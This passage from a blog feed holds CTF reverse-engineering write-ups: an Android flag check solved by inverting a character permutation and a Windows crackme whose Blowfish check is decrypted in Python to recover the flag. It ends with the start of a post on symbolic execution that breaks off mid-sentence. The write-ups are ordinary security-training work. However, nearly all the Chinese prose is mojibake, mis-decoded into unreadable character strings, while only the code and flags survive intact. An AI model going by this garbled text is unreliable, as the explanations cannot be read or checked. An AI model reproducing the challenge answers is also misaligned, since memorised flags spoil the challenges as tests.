class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„cmpæ˜¯å®ƒçš„idå€¼è€Œä¸æ˜¯å®ƒçš„å…·ä½“å€¼</p><p>æ‰€ä»¥åŠ¨æ€è°ƒè¯•æ‰¾åˆ°ç»ˆå€¼</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">49021</span>&#125;<span class="number">5</span>f919038b440139g74b7Dc88330e5d&#123;<span class="number">6</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œä½¿ç”¨äº†Game.checkflagæ¥åŠ å¯†</p><p>æ‰€ä»¥å…ˆçœ‹è¿™ä¸ª</p><p>æ ¹æ®game</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> game;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> p004go.Seq;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Game</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">_init</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title function_">checkflag</span><span class="params">(String str)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        Seq.touch();</span><br><span class="line">        _init();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Game</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">touch</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ€€ç–‘checkflagæ˜¯é€šè¿‡libåŠ è½½çš„</p><p>æ‰“å¼€idaï¼Œåæ±‡ç¼–soæ–‡ä»¶</p><p>æœç´¢checkflag</p><p>æ‰¾åˆ°5ä¸ªå‡½æ•°</p><p><img src="https://s2.loli.net/2023/12/28/Z4TbAVSxCklJaOB.png" alt="image-20231228150946781"></p><p>å‡½æ•°æ˜¯è¿™å‡ ä¸ª</p><p>å¥½å¤æ‚ï¼Œçœ‹ä¸æ‡‚ã€‚ã€‚</p><p>çœ‹äº†çœ‹wpï¼Œå‘ç°ä¸€ä¸ªä¸€ç›´æ²¡æ³¨æ„çš„ä¸œè¥¿ï¼Œå¦‚æœè¾“å…¥</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1234567890</span>å˜ä¸º<span class="number">6143580927</span>ï¼Œ</span><br><span class="line">&#123;qwertyuiopasdfghjklzxcvbnm&#125;å˜ä¸ºbhgsruc&#123;iojqkdpwnezyvxa&#125;lfmt</span><br></pre></td></tr></table></figure><p>è¯´æ˜è¿™åªæ˜¯å­—ç¬¦äº¤æ¢ï¼Œäº¤æ¢ä¹‹åæ˜¯</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">49021</span>&#125;<span class="number">5</span>f919038b440139g74b7Dc88330e5d&#123;<span class="number">6</span></span><br></pre></td></tr></table></figure><p>ä¸€å…±38ä¸ªå­—ç¬¦</p><p>é‚£ä¹ˆå°è¯•è¾“å…¥</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">t<span class="number">2</span>F<span class="number">7</span>GTglISYL<span class="symbol">nMzc6</span>CqhD<span class="symbol">N5</span>OdX<span class="number">8</span>wPjsKufVbE&#125;</span><br></pre></td></tr></table></figure><p>å˜ä¸º</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NVLjz&#125;ShscYPndXT62qlDFO5I8tgEKw7ufbMGC</span><br></pre></td></tr></table></figure><p>æ ¹æ®è¿™ä¸ªå¯¹åº”å…³ç³»ï¼Œé€†å‘è§£å‡ºåŸæ¥çš„å…³ç³»</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">d1 = <span class="string">&#x27;t2F7GTglISYLnMzc6CqhDN5OdX8wPjsKufVbE&#125;&#x27;</span></span><br><span class="line">d2 = <span class="string">&#x27;NVLjz&#125;ShscYPndXT62qlDFO5I8tgEKw7ufbMGC&#x27;</span></span><br><span class="line"></span><br><span class="line">f2 = <span class="string">&#x27;49021&#125;5f919038b440139g74b7Dc88330e5d&#123;6&#x27;</span></span><br><span class="line">f1 = <span class="selector-attr">[0]</span>*<span class="number">38</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">38</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">38</span>):</span><br><span class="line">        <span class="keyword">if</span> (d2<span class="selector-attr">[j]</span> == d1<span class="selector-attr">[i]</span>):</span><br><span class="line">            f1<span class="selector-attr">[i]</span> = f2<span class="selector-attr">[j]</span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">&#x27;&#x27;</span>.join(f1)</span></span>)</span><br><span class="line">#D0g3&#123;<span class="number">4</span>c3b5903d11461f94478b7302980e958&#125;</span><br></pre></td></tr></table></figure><p>æ€»ç»“ï¼š</p><p>çŒœæµ‹è¾“å…¥æ—¶å°½é‡ä½¿ç”¨æœ‰è§„å¾‹çš„å­—ç¬¦ï¼Œæ›´å®¹æ˜“çœ‹æ¸…</p><p>å¦‚æœä¸å®¹æ˜“é€†å‘å¯ä»¥å°è¯•çœ‹æˆ–è€…çŒœ</p><h2 id="ä½ è§è¿‡è“è‰²çš„å°é²¸é±¼å—">ä½ è§è¿‡è“è‰²çš„å°é²¸é±¼å—</h2><p>æ‰“å¼€æ–‡ä»¶åï¼Œå‘ç°æ˜¯winç¨‹åºï¼Œè¯´æ˜è¿›å…¥ä¸»çª—å£ç¨‹åºå’Œåˆ¤æ–­å‡½æ•°ä¸ä¸€å®šåœ¨ä¸€ä¸ªä½ç½®</p><p>æ‰€ä»¥æ‰“å¼€åéœ€è¦æ‰¾åˆ°åˆ¤æ–­ä»£ç ï¼Œæœç´¢stringæ— æ•ˆ</p><p>æ ¹æ®å¼¹çª—å‡½æ•°æ˜¯MessageBoxï¼Œå°è¯•æœç´¢</p><p>ç„¶åæ‰¾åˆ°åˆ¤æ–­å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __thiscall <span class="title function_">lastcall</span><span class="params">(<span class="type">void</span> *this)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> wrong[<span class="number">28</span>]; <span class="comment">// [esp+D0h] [ebp-54h] BYREF</span></span><br><span class="line">  CHAR yes[<span class="number">20</span>]; <span class="comment">// [esp+ECh] [ebp-38h] BYREF</span></span><br><span class="line">  CHAR Caption[<span class="number">24</span>]; <span class="comment">// [esp+100h] [ebp-24h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *v5; <span class="comment">// [esp+118h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = this;</span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_52102F);</span><br><span class="line">  <span class="built_in">strcpy</span>(Caption, <span class="string">&quot;tip&quot;</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(yes, <span class="string">&quot;You Get It!&quot;</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(wrong, <span class="string">&quot;Wrong user/passwd&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *((_DWORD *)v5 + <span class="number">2</span>) != *((_DWORD *)v5 + <span class="number">3</span>)</span><br><span class="line">    || j__memcmp(*(<span class="type">const</span> <span class="type">void</span> **)v5, *((<span class="type">const</span> <span class="type">void</span> **)v5 + <span class="number">1</span>), *((_DWORD *)v5 + <span class="number">3</span>)) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> MessageBoxA(<span class="number">0</span>, wrong, Caption, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> MessageBoxA(<span class="number">0</span>, yes, Caption, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„v5+2å’Œv5+3ä¸€å®šæŒ‡å‘ä¸€ä¸ªæ˜¯è¾“å…¥ï¼ˆå¯èƒ½åŠ å¯†äº†ï¼‰ï¼Œå¦ä¸€ä¸ªè¯´ä¸å‡†ï¼Œå› ä¸ºæœ‰ä¸€ä¸ªå¯†ç ä¸€ä¸ªç”¨æˆ·å</p><p>ç”±äºéœ€è¦è¿›å…¥elseåˆ†æ”¯ï¼Œæ‰€ä»¥æ¡ä»¶å¿…é¡»ä¸ºå‡</p><p>å³ï¼š</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*((_DWORD *)v5 + <span class="number">2</span>) == *((_DWORD *)v5 + <span class="number">3</span>)</span><br><span class="line">    &amp;&amp; ï¼j__memcmp<span class="comment">(*(const void **)</span>v5, *((<span class="keyword">const</span> void **)v5 + <span class="number">1</span>), *((_DWORD *)v5 + <span class="number">3</span>))</span><br></pre></td></tr></table></figure><p>æ—¢ç„¶å¦‚æ­¤ï¼Œéœ€è¦æ‰¾å‡ºèƒ½æ”¹å˜v5+2å’Œ+3çš„åœ°å€çš„å‡½æ•°ï¼ˆä¿®æ”¹äº†thisï¼‰ï¼Œå‘ä¸Šæ‰¾ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> *v4; <span class="comment">// [esp+10h] [ebp-154h]</span></span><br><span class="line">  <span class="type">void</span> *v5; <span class="comment">// [esp+24h] [ebp-140h]</span></span><br><span class="line">  CHAR *v6; <span class="comment">// [esp+114h] [ebp-50h]</span></span><br><span class="line">  CHAR *lpString; <span class="comment">// [esp+120h] [ebp-44h]</span></span><br><span class="line">  HWND DlgItem; <span class="comment">// [esp+12Ch] [ebp-38h]</span></span><br><span class="line">  HWND hWnd; <span class="comment">// [esp+138h] [ebp-2Ch]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+144h] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> WindowTextLengthA; <span class="comment">// [esp+150h] [ebp-14h]</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_52105E);</span><br><span class="line">  hWnd = GetDlgItem((HWND)argc, <span class="number">1003</span>);</span><br><span class="line">  DlgItem = GetDlgItem((HWND)argc, <span class="number">1004</span>);</span><br><span class="line">  WindowTextLengthA = GetWindowTextLengthA(hWnd);</span><br><span class="line">  v10 = GetWindowTextLengthA(DlgItem);</span><br><span class="line">  lpString = (CHAR *)j__malloc(__CFADD__(WindowTextLengthA, <span class="number">16</span>) ? <span class="number">-1</span> : WindowTextLengthA + <span class="number">16</span>);</span><br><span class="line">  result = (<span class="type">int</span>)j__malloc(__CFADD__(v10, <span class="number">16</span>) ? <span class="number">-1</span> : v10 + <span class="number">16</span>);</span><br><span class="line">  v6 = (CHAR *)result;</span><br><span class="line">  <span class="keyword">if</span> ( lpString &amp;&amp; result )</span><br><span class="line">  &#123;</span><br><span class="line">    GetWindowTextA(hWnd, lpString, WindowTextLengthA + <span class="number">16</span>);</span><br><span class="line">    GetWindowTextA(DlgItem, v6, v10 + <span class="number">16</span>);</span><br><span class="line">    v5 = operator new(<span class="number">0x10</span>u);</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_451B43(<span class="number">0x10</span>u);</span><br><span class="line">      v4 = (<span class="type">void</span> *)sub_450CE3(v5);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v4 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    sub_44FC2B(&amp;unk_51D38C, <span class="number">0x10</span>u);</span><br><span class="line">    sub_45126F(lpString, WindowTextLengthA, (<span class="type">int</span>)v6, v10);</span><br><span class="line">    j_lastcall(v4);</span><br><span class="line">    j__free(lpString);</span><br><span class="line">    j__free(v6);</span><br><span class="line">    result = (<span class="type">int</span>)v4;</span><br><span class="line">    <span class="keyword">if</span> ( v4 )</span><br><span class="line">      <span class="keyword">return</span> sub_44F77B(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŠ¨è°ƒå¯çŸ¥ï¼šç¬¬ä¸€ä¸ªæ˜¯ç”¨æˆ·åï¼Œç¬¬äºŒä¸ªæ˜¯å¯†ç </p><p>åŒ–ç®€ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> *v4; <span class="comment">// [esp+10h] [ebp-154h]</span></span><br><span class="line">  <span class="type">void</span> *v5; <span class="comment">// [esp+24h] [ebp-140h]</span></span><br><span class="line">  CHAR *password; <span class="comment">// [esp+114h] [ebp-50h]</span></span><br><span class="line">  CHAR *username; <span class="comment">// [esp+120h] [ebp-44h]</span></span><br><span class="line">  HWND DlgItem; <span class="comment">// [esp+12Ch] [ebp-38h]</span></span><br><span class="line">  HWND hWnd; <span class="comment">// [esp+138h] [ebp-2Ch]</span></span><br><span class="line">  <span class="type">int</span> lenOFpass; <span class="comment">// [esp+144h] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> lenOFname; <span class="comment">// [esp+150h] [ebp-14h]</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_52105E);</span><br><span class="line">  hWnd = GetDlgItem((HWND)argc, <span class="number">1003</span>);</span><br><span class="line">  DlgItem = GetDlgItem((HWND)argc, <span class="number">1004</span>);</span><br><span class="line">  lenOFname = GetWindowTextLengthA(hWnd);</span><br><span class="line">  lenOFpass = GetWindowTextLengthA(DlgItem);</span><br><span class="line">  username = (CHAR *)j__malloc(__CFADD__(lenOFname, <span class="number">16</span>) ? <span class="number">-1</span> : lenOFname + <span class="number">16</span>);</span><br><span class="line">  result = (<span class="type">int</span>)j__malloc(__CFADD__(lenOFpass, <span class="number">16</span>) ? <span class="number">-1</span> : lenOFpass + <span class="number">16</span>);</span><br><span class="line">  password = (CHAR *)result;</span><br><span class="line">  <span class="keyword">if</span> ( username &amp;&amp; result )                     <span class="comment">// æ£€æŸ¥ç©ºæŒ‡é’ˆ</span></span><br><span class="line">  &#123;</span><br><span class="line">    GetWindowTextA(hWnd, username, lenOFname + <span class="number">16</span>);<span class="comment">// ç”¨æˆ·å</span></span><br><span class="line">    GetWindowTextA(DlgItem, password, lenOFpass + <span class="number">16</span>);<span class="comment">// å¯†ç </span></span><br><span class="line">    v5 = operator new(<span class="number">0x10</span>u);</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_451B43(<span class="number">0x10</span>u);                        <span class="comment">// åˆ†é…å†…å­˜</span></span><br><span class="line">      v4 = (<span class="type">void</span> *)sub_450CE3(v5);              <span class="comment">// åˆå§‹åŒ–</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v4 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    sub_44FC2B(&amp;specialloc, <span class="number">0x10</span>u);             <span class="comment">// åˆå§‹åŒ–å¯¹è±¡</span></span><br><span class="line">    encode(username, lenOFname, (<span class="type">int</span>)password, lenOFpass);</span><br><span class="line">    j_lastcall(v4);                             <span class="comment">// åˆ¤æ–­</span></span><br><span class="line">    j__free(username);</span><br><span class="line">    j__free(password);</span><br><span class="line">    result = (<span class="type">int</span>)v4;</span><br><span class="line">    <span class="keyword">if</span> ( v4 )</span><br><span class="line">      <span class="keyword">return</span> sub_44F77B(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åé¢å®åœ¨åˆ†æä¸å‡ºæ¥äº†ï¼Œé‡Œé¢æœ‰ä¸€äº›æ¶‰åŠc++çš„ç†è§£çš„</p><p>åœ¨åé¢æœ‰åŠ å¯†å‡½æ•°æ˜¯blowfish</p><p>åœ¨cmpæ—¶ä¸‹æ–­ç‚¹buf1å°±æ˜¯æœ€åçš„å€¼</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11A51F049550E2508F17E16CF1632B47</span><br></pre></td></tr></table></figure><p>å†™blowfishçš„è§£å¯†ï¼š</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> Blowfish</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯†æ–‡ï¼ˆä»¥åå…­è¿›åˆ¶è¡¨ç¤ºï¼‰</span></span><br><span class="line">ciphertext_hex = <span class="string">&quot;11A51F049550E2508F17E16CF1632B47&quot;</span></span><br><span class="line">ciphertext = binascii.unhexlify(ciphertext_hex)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯†é’¥ï¼ˆç®€å•å­—ç¬¦ä¸²ï¼‰</span></span><br><span class="line">key = <span class="string">&quot;UzBtZTBuZV9EMGcz&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºBlowfish ECBæ¨¡å¼çš„è§£å¯†å™¨</span></span><br><span class="line">cipher = Blowfish.new(key.encode(<span class="string">&#x27;utf-8&#x27;</span>), Blowfish.MODE_ECB)</span><br><span class="line"></span><br><span class="line">plaintext_bytes = cipher.decrypt(ciphertext)</span><br><span class="line">plaintext = plaintext_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(plaintext)</span><br><span class="line"><span class="comment">#QHRoZWJsdWVmMXNo</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªç­”æ¡ˆæ˜¯ä¸ªbase64ï¼Œè§£å¯†åæ˜¯@thebluef1sh</p><p>ï¼ˆå’Œè“é²¸çš„å”¯ä¸€å…³ç³»å—ã€‚ã€‚ã€‚ï¼‰</p><p>æ‰€ä»¥</p><p>D0g3{UzBtZTBuZV9EMGczQHRoZWJsdWVmMXNo}</p>]]></content>
      
      
      <categories>
          
          <category> é¢˜é›† </category>
          
          <category> CTF </category>
          
          <category> æ‚é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é€†å‘ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¦å·æ‰§è¡Œç®€ä»‹</title>
      <link href="/posts/54c80afd.html"/>
      <url>/posts/54c80afd.html</url>
      
        <content type="html"><![CDATA[<p>1</p><h2 id="å®šä¹‰">å®šä¹‰</h2><blockquote><p><strong>ç¬¦å·æ‰§è¡Œ</strong>ï¼ˆè‹±è¯­ï¼šsymbolic executionï¼‰æ˜¯ä¸€ç§<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6">è®¡ç®—æœºç§‘å­¦</a>é¢†åŸŸçš„<a href="https://zh.wikipedia.org/wiki/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90">ç¨‹åºåˆ†æ</a>æŠ€æœ¯ï¼Œé€šè¿‡é‡‡ç”¨æŠ½è±¡çš„ç¬¦å·ä»£æ›¿ç²¾ç¡®å€¼ä½œä¸ºç¨‹åºè¾“å…¥å˜é‡ï¼Œå¾—å‡ºæ¯ä¸ªè·¯å¾„æŠ½è±¡çš„è¾“å‡ºç»“æœã€‚è¿™ä¸€æŠ€æœ¯åœ¨ç¡¬ä»¶ã€åº•å±‚ç¨‹åºæµ‹è¯•ä¸­æœ‰ä¸€å®šçš„åº”ç”¨ï¼Œèƒ½å¤Ÿæœ‰æ•ˆçš„å‘ç°ç¨‹åºä¸­çš„æ¼æ´ã€‚</p></blockquote><h2 id="åŸºæœ¬åŸç†">åŸºæœ¬åŸç†</h2><p>ä¸¾ä¾‹è¯´æ˜ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">f</span><span class="params">()</span> &#123;</span><br><span class="line">  y = read();</span><br><span class="line">  z = y * <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">if</span>(z == <span class="number">12</span>)&#123;</span><br><span class="line">    fail();</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;OK&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯¹äºä»¥ä¸Šä»£ç ï¼Œå¦‚æœå®é™…æ‰§è¡Œï¼Œé‚£ä¹ˆæ•ˆæœæ˜¯ï¼šè¯»å…¥ä¸€ä¸ªå€¼åˆ°yï¼Œç„¶åä»¤zç­‰äºyçš„2å€ã€‚å¦‚æœzç­‰äº6ï¼Œè°ƒç”¨fail(),åä¹‹æ‰“å°okã€‚</p><p>å¯¹äºç¬¦å·æ‰§è¡Œæ¥è¯´ï¼Œæµç¨‹ä¸­ä¸å®šçš„å€¼ä¼šè¢«èµ‹ä¸º$\lambda$,ä¸€ä¸ªç¬¦å·å€¼ï¼Œè¿™ä¸ªå€¼å¯ä»¥æ˜¯ä»»ä½•å€¼ï¼Œåœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œyä¼šç­‰äº$\lambda$ï¼Œzä¼šç­‰äº2$\lambda$ï¼Œå½“é‡åˆ°åˆ†æ”¯æ—¶ï¼Œä¼šæ¨¡æ‹Ÿæ‰§è¡Œæ‰€æœ‰åˆ†æ”¯ï¼Œå³å½“2$\lambda$ç­‰äº12æ—¶è°ƒç”¨fail(),å½“2$\lambda$ä¸ç­‰äº12æ—¶æ‰“å°okã€‚åœ¨ç¬¦å·æ‰§è¡Œå®Œæ‰€æœ‰çš„è·¯å¾„åï¼Œä¼šè®¡ç®—å‡ºä¸€ä¸ªèƒ½å®Œæˆè¿™ä¸ªè·¯å¾„çš„ç¬¦å·çš„å˜é‡å®é™…å€¼ï¼Œè¯¥ä¾‹ä¸­ï¼Œè°ƒç”¨fail()æ˜¯$\lambda$==6çš„ç»“æœï¼Œæ‰“å°okæ˜¯$\lambda$ï¼=6æ—¶æˆç«‹</p><p>ä¸Šé¢è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œæ¯ä¸€ä¸ªæ¡ä»¶è¢«å«åšä¸€ä¸ª<code>çº¦æŸ</code>ï¼Œæ¯ä¸€ä¸ªç»“æœå¯¹åº”çš„æ‰€æœ‰çº¦æŸè¢«ç§°ä¸ºçº¦æŸé›†ï¼Œæ¯ä¸€ä¸ªç»“æœç»è¿‡çš„çº¦æŸé›†è¢«ç§°ä¸º<code>è·¯å¾„</code>ï¼Œè·¯å¾„å¯ä»¥ç”±æ‰§è¡Œæ ‘è¡¨ç¤ºã€‚è€Œç¬¦å·æ‰§è¡Œçš„ç›®çš„ï¼Œå°±æ˜¯è®©ç¬¦å·å€¼éå†æ‰€æœ‰è·¯å¾„ï¼Œæ‰¾åˆ°æ‰€æœ‰å¯¹åº”çš„çº¦æŸé›†ã€‚</p><p>ä¸ºäº†å®Œæˆä»¥ä¸Šå·¥ä½œï¼Œåœ¨æ•´ä¸ªæµç¨‹ä¸­å­˜åœ¨ä¸¤ä¸ªå˜é‡<code>ç¬¦å·çŠ¶æ€</code>$\sigma$å’Œ<code>è·¯å¾„æ¡ä»¶</code>$PC$ï¼Œå¹¶æ ¹æ®è¯»åˆ°çš„è¯­å¥å¯¹çº¦æŸè¿›è¡Œæ·»åŠ ï¼ˆä»¥ä¸‹ä¸ºä¾‹å­ï¼‰ï¼š</p><ul><li>è‹¥æ˜¯è¾“å…¥è¯­å¥ï¼Œåœ¨$\sigma$ä¸­æ·»åŠ æ˜ å°„ï¼š$\sigma$={var$\rightarrow$$\lambda_0$},æ­¤æ—¶$\lambda_0$æ˜¯varå˜é‡çš„ç¬¦å·å€¼ã€‚</li><li>è‹¥æ˜¯èµ‹å€¼è¯­å¥ï¼Œåˆ™æŠŠç¬¦å·å€¼ä»£å…¥è®¡ç®—ï¼Œåœ¨$\sigma$ä¸­æ·»åŠ æ˜ 